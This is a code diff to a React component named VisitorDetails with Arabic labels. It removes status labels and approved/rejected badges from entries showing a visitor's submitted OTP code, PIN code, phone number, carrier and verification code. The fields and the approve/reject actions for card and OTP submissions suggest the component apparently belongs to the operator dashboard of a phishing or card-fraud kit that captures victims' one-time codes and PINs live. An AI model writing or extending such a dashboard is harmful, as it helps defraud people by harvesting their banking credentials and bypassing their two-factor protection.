@@ -286,10 +286,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         icon: "🔑",
         color: "pink",
         data: {
-          "الكود": (visitor as any)._v5,
-          "الحالة": otpStatus === "approved" ? "✓ تم القبول" : 
-                    otpStatus === "rejected" ? "✗ تم الرفض" : 
-                    otpStatus === "verifying" ? "⬳ قيد المراجعة" : "⬳ قيد المراجعة"
+          "الكود": (visitor as any)._v5
         },
         timestamp: (visitor as any).otpUpdatedAt || visitor.updatedAt,
         status: otpStatus === "approved" ? "approved" as const : 
@@ -314,9 +311,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             icon: "🔑",
             color: "pink",
             data: {
-              "الكود": otp,
-              "الحالة": otpHistory.status === "approved" ? "✓ تم القبول" : 
-                        otpHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+              "الكود": otp
             },
             timestamp: otpHistory.timestamp,
             status: otpHistory.status || "pending" as const,
@@ -347,9 +342,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           icon: "🔐",
           color: "indigo",
           data: {
-            "الكود": pinCode,
-            "الحالة": pinHistory.status === "approved" ? "✓ تم القبول" : 
-                      pinHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+            "الكود": pinCode
           },
           timestamp: pinHistory.timestamp,
           status: pinHistory.status || "pending" as const,
@@ -378,9 +371,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         color: "teal",
         data: {
           "رقم الجوال": visitor.phoneNumber,
-          "شركة الاتصالات": visitor.phoneCarrier,
-          "الحالة": phoneStatus === "approved" ? "✓ تم القبول" : 
-                    phoneStatus === "rejected" ? "✗ تم الرفض" : "⬳ في انتظار الموافقة"
+          "شركة الاتصالات": visitor.phoneCarrier
         },
         timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
         status: phoneStatus === "approved" ? "approved" as const : 
@@ -404,9 +395,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             color: "teal",
             data: {
               "رقم الجوال": phoneNumber,
-              "شركة الاتصالات": phoneCarrier,
-              "الحالة": phoneHistory.status === "approved" ? "✓ تم القبول" : 
-                        phoneHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ في انتظار الموافقة"
+              "شركة الاتصالات": phoneCarrier
             },
             timestamp: phoneHistory.timestamp,
             status: phoneHistory.status || "pending" as const,
@@ -455,9 +444,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           icon: "✅",
           color: "pink",
           data: {
-            "كود التحقق": phoneOtp,
-            "الحالة": phoneOtpHistory.status === "approved" ? "✓ تم القبول" : 
-                      phoneOtpHistory.status === "rejected" ? "✗ تم الرفض" : "⬳ قيد المراجعة"
+            "كود التحقق": phoneOtp
           },
           timestamp: phoneOtpHistory.timestamp,
           status: phoneOtpHistory.status || "pending" as const,
@@ -711,15 +698,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               layout="vertical"
               actions={
                 bubble.customActions ? bubble.customActions : 
-                bubble.status === "approved" ? (
-                  <div className="mt-3 px-4 py-2 bg-green-100 text-green-700 rounded-lg text-sm font-medium text-center">
-                    ✓ تمت الموافقة
-                  </div>
-                ) : bubble.status === "rejected" ? (
-                  <div className="mt-3 px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium text-center">
-                    ✗ تم الرفض
-                  </div>
-                ) : bubble.showActions ? (
+                bubble.showActions ? (
                   <div className="flex gap-2 mt-3">
                     {bubble.type === "card" && (
                       <>
@@ -816,15 +795,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               layout="vertical"
               actions={
                 bubble.customActions ? bubble.customActions : 
-                bubble.status === "approved" ? (
-                  <div className="mt-3 px-4 py-2 bg-green-100 text-green-700 rounded-lg text-sm font-medium text-center">
-                    ✓ تمت الموافقة
-                  </div>
-                ) : bubble.status === "rejected" ? (
-                  <div className="mt-3 px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium text-center">
-                    ✗ تم الرفض
-                  </div>
-                ) : bubble.showActions ? (
+                bubble.showActions ? (
                   <div className="flex gap-2 mt-3">
                     {bubble.type === "otp" && (
                       <>
